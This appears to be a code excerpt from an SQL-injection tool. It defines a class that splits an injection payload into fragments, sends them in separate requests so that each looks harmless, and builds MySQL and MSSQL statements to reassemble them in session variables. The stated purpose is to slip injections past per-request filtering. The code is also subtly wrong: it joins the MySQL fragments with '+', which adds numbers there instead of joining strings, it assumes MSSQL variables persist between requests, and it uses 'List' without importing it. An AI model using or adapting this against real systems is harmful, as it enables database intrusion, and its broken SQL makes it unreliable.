#  v23-11: Time-Delayed Payload Assembly 

class TimedPayloadAssembly:
    """Sends payload fragments across multiple time-separated requests.
    Backend assembles via session/temp tables. Each request is harmless alone.
    """

    @staticmethod
    def fragment_payload(payload: str, n_fragments: int = 3) -> List[str]:
        """Split payload into n time-separated fragments."""
        chunk_size = len(payload) // n_fragments
        fragments = []
        for i in range(n_fragments):
            start = i * chunk_size
            end = start + chunk_size if i < n_fragments - 1 else len(payload)
            fragments.append(payload[start:end])
        return fragments

    @staticmethod
    def build_session_assembly_sql(fragments: List[str],
                                     dbms: str = "MySQL") -> List[str]:
        """Build SQL that stores fragments in session variables for assembly."""
        queries = []
        if dbms in ("MySQL", "MariaDB"):
            for i, frag in enumerate(fragments):
                queries.append(f"SET @f{i}='{frag}'")
            concat = "+".join(f"@f{i}" for i in range(len(fragments)))
            queries.append(f"SELECT ({concat})")
        elif dbms == "MSSQL":
            for i, frag in enumerate(fragments):
                queries.append(f"DECLARE @f{i} VARCHAR(MAX)='{frag}'")
            concat = "+".join(f"@f{i}" for i in range(len(fragments)))
            queries.append(f"SELECT {concat}")
        return queries


